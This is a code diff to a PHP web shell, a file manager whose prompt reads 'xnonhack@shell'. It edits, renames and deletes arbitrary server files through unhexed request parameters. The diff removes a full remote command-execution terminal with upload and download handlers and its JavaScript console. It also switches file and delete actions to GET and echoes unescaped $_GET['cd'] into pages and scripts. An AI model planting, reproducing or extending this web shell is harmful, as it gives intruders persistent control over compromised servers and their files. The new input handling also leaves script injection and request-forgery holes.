@@ -188,6 +188,7 @@ if (!isset($_SESSION['login'])) {
 		background: var(--color-bg);
 		color: #1889f5;
 		font-weight: bold;
+		position: relative;
 		outline: none;
 		float: right;
 		padding:3px;
@@ -199,9 +200,11 @@ if (!isset($_SESSION['login'])) {
 	button.chname {
 		width:30px;
 	}
+	button.ch {
+		width:63px;
+	}
 	button.delete {
 		width:63px;
-		padding:0;
 	}
 	div.tool span {
 		font-size:14px;
@@ -572,6 +575,9 @@ if (!isset($_SESSION['login'])) {
     	margin: 13px;
     	font-size:20px;
     }
+    a.context-menu-one:hover {
+    	cursor: pointer;
+    }
     #submit,
     #upload {
   		position: relative;
@@ -602,83 +608,6 @@ if (!isset($_SESSION['login'])) {
     .navbar .icon {
         display: none;
      }
-     #shell {
-		background: #222;
-		max-width: 800px;
-		margin: 50px auto 0 auto;
-		box-shadow: 0 0 5px rgba(0, 0, 0, .3);
-		font-size: 10pt;
-		display: flex;
-		flex-direction: column;
-		align-items: stretch;
-	}
-	#shell-content {
-		height: 500px;
-		overflow: auto;
-		padding: 5px;
-		white-space: pre-wrap;
-		flex-grow: 1;
-	}
-	#shell-logo {
-		font-weight: bold;
-		color: #FF4180;
-		text-align: center;
-	}
-	@media (max-width: 991px) {
-		#shell-logo {
-			display: none;
-		}
-		#shell {
-			height: 100%;
-			width: 100%;
-			max-width: none;
-		}
-        #shell {
-        	margin-top: 0;
-        }
-    }
-    @media (max-width: 767px) {
-    	#shell-input {
-    		flex-direction: column;
-    	}
-    }
-    .shell-prompt {
-    	font-weight: bold;
-    	color: #75DF0B;
-    }
-    .shell-prompt > span {
-    	color: #1BC9E7;
-    }
-    #shell-input {
-    	display: flex;
-    	box-shadow: 0 -1px 0 rgba(0, 0, 0, .3);
-    	border-top: rgba(255, 255, 255, .05) solid 1px;
-    }
-    #shell-input > label {
-		flex-grow: 0;
-		display: block;
-		padding: 0 5px;
-		height: 30px;
-		line-height: 30px;
-	}
-	#shell-input #shell-cmd {
-		height: 30px;
-		line-height: 30px;
-		border: none;
-		background: transparent;
-		color: #eee;
-		font-family: monospace;
-		font-size: 10pt;
-		width: 100%;
-		align-self: center;
-	}
-	#shell-input div {
-		flex-grow: 1;
-		align-items: stretch;
-	}
-	#shell-input input {
-		outline: none;
-	}
 	@media (min-width: 320px) and (max-width: 480px) {
 		body {
 			margin:0;
@@ -686,6 +615,8 @@ if (!isset($_SESSION['login'])) {
 		}
 		* {
 			font-size: 12px;
+		}
+		button.delete {
 		}
 		.navbar {
 			display: block;
@@ -754,6 +685,17 @@ if (!isset($_SESSION['login'])) {
             width:76%;
             text-align: left;
         }
+        ::-webkit-scrollbar {
+  			width:0;
+		}
+		::-webkit-scrollbar-track {
+		}
+		::-webkit-scrollbar-thumb {
+  			background: none;
+		}
+		::-webkit-scrollbar-thumb:hover {
+  			background: #dfeaf5;
+		}
 	}
 </style>
 <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
@@ -1303,7 +1245,7 @@ function myFunction() {
         	}
     	}
 	}
-	$_POST['file'] = (isset($_POST['file'])) ? x::unhex($_POST['file']) : false;
+	$_GET['file'] = (isset($_GET['file'])) ? x::unhex($_GET['file']) : false;
 	?>
 	<div class="row">
 		<div class="col-xs-2 tool">
@@ -1386,268 +1328,6 @@ function myFunction() {
 							break;
 					}
 				}
-			}
-			if (isset($_GET['terminal'])) {
-				if (isset($_GET["feature"])) {
-					$response = NULL;
-					switch ($_GET["feature"]) {
-						case "shell":
-            				$cmd = $_POST['cmd'];
-            				if (!preg_match('/2>/', $cmd)) {
-            					$cmd .= ' 2>&1';
-            				} 
-            				$response = x::featureShell($cmd, $_POST["cwd"]);
-            				break;
-        				case "pwd":
-            				$response = x::featurePwd();
-            				break;
-        				case "hint":
-            				$response = x::featureHint($_POST['filename'], $_POST['cwd'], $_POST['type']);
-            				break;
-        				case 'upload':
-            				$response = x::featureUpload($_POST['path'], $_POST['file'], $_POST['cwd']);
-            			}
-            			header("Content-Type: application/json");
-            			echo json_encode($response);
-            			die();
-            		}
-				?>
-			<script>
-            var CWD = null;
-            var commandHistory = [];
-            var historyPosition = 0;
-            var eShellCmdInput = null;
-            var eShellContent = null;
-
-            function _insertCommand(command) {
-                eShellContent.innerHTML += "\n\n";
-                eShellContent.innerHTML += '<span class=\"shell-prompt\">' + genPrompt(CWD) + '</span> ';
-                eShellContent.innerHTML += escapeHtml(command);
-                eShellContent.innerHTML += "\n";
-                eShellContent.scrollTop = eShellContent.scrollHeight;
-            }
-
-            function _insertStdout(stdout) {
-                eShellContent.innerHTML += escapeHtml(stdout);
-                eShellContent.scrollTop = eShellContent.scrollHeight;
-            }
-
-            function featureShell(command) {
-
-                _insertCommand(command);
-                if (/^\s*upload\s+[^\s]+\s*$/.test(command)) {
-                    featureUpload(command.match(/^\s*upload\s+([^\s]+)\s*$/)[1]);
-                } else if (/^\s*clear\s*$/.test(command)) {
-                    // Backend shell TERM environment variable not set. Clear command history from UI but keep in buffer
-                    eShellContent.innerHTML = '';
-                } else {
-                    makeRequest("?feature=shell", {cmd: command, cwd: CWD}, function (response) {
-                        if (response.hasOwnProperty('file')) {
-                            featureDownload(response.name, response.file)
-                        } else {
-                            _insertStdout(response.stdout.join("\n"));
-                            updateCwd(response.cwd);
-                        }
-                    });
-                }
-            }
-
-            function featureHint() {
-                if (eShellCmdInput.value.trim().length === 0) return;  // field is empty -> nothing to complete
-
-                function _requestCallback(data) {
-                    if (data.files.length <= 1) return;  // no completion
-
-                    if (data.files.length === 2) {
-                        if (type === 'cmd') {
-                            eShellCmdInput.value = data.files[0];
-                        } else {
-                            var currentValue = eShellCmdInput.value;
-                            eShellCmdInput.value = currentValue.replace(/([^\s]*)$/, data.files[0]);
-                        }
-                    } else {
-                        _insertCommand(eShellCmdInput.value);
-                        _insertStdout(data.files.join("\n"));
-                    }
-                }
-
-                var currentCmd = eShellCmdInput.value.split(" ");
-                var type = (currentCmd.length === 1) ? "cmd" : "file";
-                var fileName = (type === "cmd") ? currentCmd[0] : currentCmd[currentCmd.length - 1];
-
-                makeRequest(
-                    "?feature=hint",
-                    {
-                        filename: fileName,
-                        cwd: CWD,
-                        type: type
-                    },
-                    _requestCallback
-                );
-
-            }
-
-            function featureDownload(name, file) {
-                var element = document.createElement('a');
-                element.setAttribute('href', 'data:application/octet-stream;base64,' + file);
-                element.setAttribute('download', name);
-                element.style.display = 'none';
-                document.body.appendChild(element);
-                element.click();
-                document.body.removeChild(element);
-                _insertStdout('Done.');
-            }
-
-            function featureUpload(path) {
-                var element = document.createElement('input');
-                element.setAttribute('type', 'file');
-                element.style.display = 'none';
-                document.body.appendChild(element);
-                element.addEventListener('change', function () {
-                    var promise = getBase64(element.files[0]);
-                    promise.then(function (file) {
-                        makeRequest('?feature=upload', {path: path, file: file, cwd: CWD}, function (response) {
-                            _insertStdout(response.stdout.join("\n"));
-                            updateCwd(response.cwd);
-                        });
-                    }, function () {
-                        _insertStdout('An unknown client-side error occurred.');
-                    });
-                });
-                element.click();
-                document.body.removeChild(element);
-            }
-
-            function getBase64(file, onLoadCallback) {
-                return new Promise(function(resolve, reject) {
-                    var reader = new FileReader();
-                    reader.onload = function() { resolve(reader.result.match(/base64,(.*)$/)[1]); };
-                    reader.onerror = reject;
-                    reader.readAsDataURL(file);
-                });
-            }
-
-            function genPrompt(cwd) {
-                cwd = cwd || "~";
-                var shortCwd = cwd;
-                if (cwd.split("/").length > 3) {
-                    var splittedCwd = cwd.split("/");
-                    shortCwd = "…/" + splittedCwd[splittedCwd.length-2] + "/" + splittedCwd[splittedCwd.length-1];
-                }
-                return "xnonhack@shell:<span title=\"" + cwd + "\">" + shortCwd + "</span>#";
-            }
-
-            function updateCwd(cwd) {
-                if (cwd) {
-                    CWD = cwd;
-                    _updatePrompt();
-                    return;
-                }
-                makeRequest("?feature=pwd", {}, function(response) {
-                    CWD = response.cwd;
-                    _updatePrompt();
-                });
-
-            }
-
-            function escapeHtml(string) {
-                return string
-                    .replace(/&/g, "&amp;")
-                    .replace(/</g, "&lt;")
-                    .replace(/>/g, "&gt;");
-            }
-
-            function _updatePrompt() {
-                var eShellPrompt = document.getElementById("shell-prompt");
-                eShellPrompt.innerHTML = genPrompt(CWD);
-            }
-
-            function _onShellCmdKeyDown(event) {
-                switch (event.key) {
-                    case "Enter":
-                        featureShell(eShellCmdInput.value);
-                        insertToHistory(eShellCmdInput.value);
-                        eShellCmdInput.value = "";
-                        break;
-                    case "ArrowUp":
-                        if (historyPosition > 0) {
-                            historyPosition--;
-                            eShellCmdInput.blur();
-                            eShellCmdInput.focus();
-                            eShellCmdInput.value = commandHistory[historyPosition];
-                        }
-                        break;
-                    case "ArrowDown":
-                        if (historyPosition >= commandHistory.length) {
-                            break;
-                        }
-                        historyPosition++;
-                        if (historyPosition === commandHistory.length) {
-                            eShellCmdInput.value = "";
-                        } else {
-                            eShellCmdInput.blur();
-                            eShellCmdInput.focus();
-                            eShellCmdInput.value = commandHistory[historyPosition];
-                        }
-                        break;
-                    case 'Tab':
-                        event.preventDefault();
-                        featureHint();
-                        break;
-                }
-            }
-
-            function insertToHistory(cmd) {
-                commandHistory.push(cmd);
-                historyPosition = commandHistory.length;
-            }
-
-            function makeRequest(url, params, callback) {
-                function getQueryString() {
-                    var a = [];
-                    for (var key in params) {
-                        if (params.hasOwnProperty(key)) {
-                            a.push(encodeURIComponent(key) + "=" + encodeURIComponent(params[key]));
-                        }
-                    }
-                    return a.join("&");
-                }
-                var xhr = new XMLHttpRequest();
-                xhr.open("POST", url, true);
-                xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-                xhr.onreadystatechange = function() {
-                    if (xhr.readyState === 4 && xhr.status === 200) {
-                        try {
-                            var responseJson = JSON.parse(xhr.responseText);
-                            callback(responseJson);
-                        } catch (error) {
-                            alert("Error while parsing response: " + error);
-                        }
-                    }
-                };
-                xhr.send(getQueryString());
-            }
-
-            window.onload = function() {
-                eShellCmdInput = document.getElementById("shell-cmd");
-                eShellContent = document.getElementById("shell-content");
-                updateCwd();
-                eShellCmdInput.focus();
-            };
-        </script>
-        <div id="shell">
-            <pre id="shell-content">
-                <div id="shell-logo"></div>
-            </pre>
-            <div id="shell-input">
-                <label for="shell-cmd" id="shell-prompt" class="shell-prompt">???</label>
-                <div>
-                    <input id="shell-cmd" name="cmd" onkeydown="_onShellCmdKeyDown(event)"/>
-                </div>
-            </div>
-        </div>
-			<?php
-			exit();
 			}
 			if (isset($_GET['upload'])) {
 				?>
@@ -1895,9 +1575,9 @@ function myFunction() {
 					exit();
 					break;
 			}
-			switch (@$_POST['action']) {
+			switch (@$_GET['action']) {
 				case 'delete':
-					if (x::delete($_POST['file'])) {
+					if (x::delete($_GET['file'])) {
 						print("<script>alert('<h3>Deleted</i></h3>')</script>");
 					} else {
 						print("<script>alert('<h3>permission danied</h3>')</script>");
@@ -1905,14 +1585,14 @@ function myFunction() {
 					break;
 				case 'chname':
 					if (isset($_POST['chname'])) {
-						if (x::chname($_POST['file'], x::unhex($_GET['cd']) . DIRECTORY_SEPARATOR . $_POST['newname'])) {
+						if (x::chname($_GET['file'], x::unhex($_GET['cd']) . DIRECTORY_SEPARATOR . $_POST['newname'])) {
 							print("<script>alert('<h3>success</h3>')</script>");
 						} else {
 							print("<script>alert('<h3>failed</h3>')</script>");
 						}
 					}
 					switch ($_POST['file']) {
-						case is_dir($_POST['file']):
+						case is_dir($_GET['file']):
 							?>
 							<div class="chname">
 								<table width="100%" class="chname">
@@ -1927,7 +1607,7 @@ function myFunction() {
 										</td>
 										<td>:</td>
 										<td>
-											<?= x::w__($_POST['file'], basename($_POST['file'])) ?>
+											<?= x::w__($_GET['file'], basename($_GET['file'])) ?>
 										</td>
 									</tr>
 									<tr>
@@ -1936,8 +1616,8 @@ function myFunction() {
 										</td>
 										<td>:</td>
 										<td>
-											<?= filetype($_POST['file']) ?>  
-											<i><?= x::countDir($_POST['file']) ?> items</i>
+											<?= filetype($_GET['file']) ?>  
+											<i><?= x::countDir($_GET['file']) ?> items</i>
 										</td>
 									</tr>
 									<tr>
@@ -1946,14 +1626,14 @@ function myFunction() {
 										</td>
 										<td>:</td>
 										<td>
-											<?= x::ftime($_POST['file']) ?>
+											<?= x::ftime($_GET['file']) ?>
 										</td>
 									</tr>
 									<tr>
 										<form method="post" action="?cd=<?= $_GET['cd'] ?>">
 											<td colspan="3">
 												<div class="button">
-													<button name="open" value="<?= x::hex($_POST['file']) ?>">
+													<button name="open" value="<?= x::hex($_GET['file']) ?>">
 														<i class="far fa-edit" title="Edit"></i>&nbsp;
 														Open
 													</button>
@@ -1967,19 +1647,19 @@ function myFunction() {
 													</button>
 												</div>
 											</td>
-										<input type="hidden" name="file" value="<?= x::hex($_POST['file']) ?>">
+										<input type="hidden" name="file" value="<?= x::hex($_GET['file']) ?>">
 										</form>
 									</tr>
 									<form method="post">
 										<tr>
 											<td colspan="3">
-												<input type="text" name="newname" value="<?= basename($_POST['file']) ?>">
+												<input type="text" name="newname" value="<?= basename($_GET['file']) ?>">
 											</td>
 										</tr>
 										<tr>
 											<td colspan="3">
 												<input type="submit" name="chname" value="CHANGE">
-												<input type="hidden" name="file" value="<?= x::hex($_POST['file']) ?>">
+												<input type="hidden" name="file" value="<?= x::hex($_GET['file']) ?>">
 												<input type="hidden" name="action" value="chname">
 											</td>
 										</tr>
@@ -2093,7 +1773,7 @@ function myFunction() {
 								</td>
 								<td>:</td>
 								<td>
-									<?= x::w__($_POST['file'], basename($_POST['file'])) ?>
+									<?= x::w__($_GET['file'], basename($_GET['file'])) ?>
 								</td>
 								</tr>
 							<tr>
@@ -2102,7 +1782,7 @@ function myFunction() {
 								</td>
 								<td>:</td>
 								<td>
-									<?= x::size($_POST['file']) ?>
+									<?= x::size($_GET['file']) ?>
 								</td>
 							</tr>
 							<tr>
@@ -2111,7 +1791,7 @@ function myFunction() {
 								</td>
 								<td>:</td>
 								<td>
-									<?= x::ftime($_POST['file']) ?>
+									<?= x::ftime($_GET['file']) ?>
 								</td>
 							</tr>
 							<tr>
@@ -2136,19 +1816,19 @@ function myFunction() {
 											</button>
 										</div>
 									</td>
-									<input type="hidden" name="file" value="<?= x::hex($_POST['file']) ?>">
+									<input type="hidden" name="file" value="<?= x::hex($_GET['file']) ?>">
 								</form>
 							</tr>
 							<form method="post">
 								<tr>
 									<td colspan="3">
-										<textarea name="data"><?= htmlspecialchars(file_get_contents($_POST['file'])) ?></textarea>
+										<textarea name="data"><?= htmlspecialchars(file_get_contents($_GET['file'])) ?></textarea>
 									</td>
 								</tr>
 								<tr>
 									<td colspan="3">
 										<input type="submit" name="edit" value="SAVE">
-										<input type="hidden" name="file" value="<?= x::hex($_POST['file']) ?>">
+										<input type="hidden" name="file" value="<?= x::hex($_GET['file']) ?>">
 										<input type="hidden" name="action" value="edit">
 									</td>
 								</tr>
@@ -2184,11 +1864,8 @@ function myFunction() {
 										<div class="name">
 											<div class="file">
 												<?= basename($dir['name']) ?>
-												<button class="chname" name="action" value="chname" title="Rename">
+												<button class="chname ch" name="action" value="chname" title="Rename">
 													<i class="fa fa-magic" aria-hidden="true"></i>
-												</button>
-												<button class="edit" name="action" value="edit" title="Edit">
-													<i class="far fa-edit" title="Edit"></i>
 												</button>
 											</div>
 											<div class="date">
@@ -2208,17 +1885,12 @@ function myFunction() {
 					</form>
 				<?php }
 				foreach (x::files('file') as $file) {
-					//if (strlen($file['name']) > 28) {
-					//	$filename = substr($file['name'], 0, 28)."...-.". pathinfo($file['name'], PATHINFO_EXTENSION);
-					//} else {
-					//	$filename = $file['name'];
-					//}
 					?>
 					<form method="post" action="?cd=<?= x::hex(x::cwd()) ?>">
 						<tr>
 							<td class="files">
 								<div class="block">
-									<a href="?cd=<?= x::hex(x::cwd()) ?>&preview=<?= x::hex($file['name']) ?>">
+									<a class="menu">
 										<div class="img">
 											<img src="https://image.flaticon.com/icons/svg/716/716819.svg">
 										</div>
@@ -2243,6 +1915,26 @@ function myFunction() {
 											</div>
 										</div>
 									</a>
+									<script type="text/javascript">
+										$(function(){
+											$.contextMenu({
+												selector: '.menu', 
+												trigger: 'left',
+												callback: function(key, options) {
+													var url = '?cd=<?= $_GET['cd'] ?>&action='+key+'&file=<?= x::hex(basename($file['name'])) ?>';
+													$(location).attr('href', url);
+												},
+												items: {
+													"edit": {name: "Edit", icon: "edit"},
+													"delete": {name: "Delete", icon: "delete"},
+												}
+											});
+										});
+									</script>
+									<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+									<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/jquery-contextmenu/2.7.1/jquery.contextMenu.min.css">
+									<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-contextmenu/2.7.1/jquery.contextMenu.min.js"></script>
+									<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-contextmenu/2.7.1/jquery.ui.position.js"></script>
 								</div>
 							</td>
 						</tr>
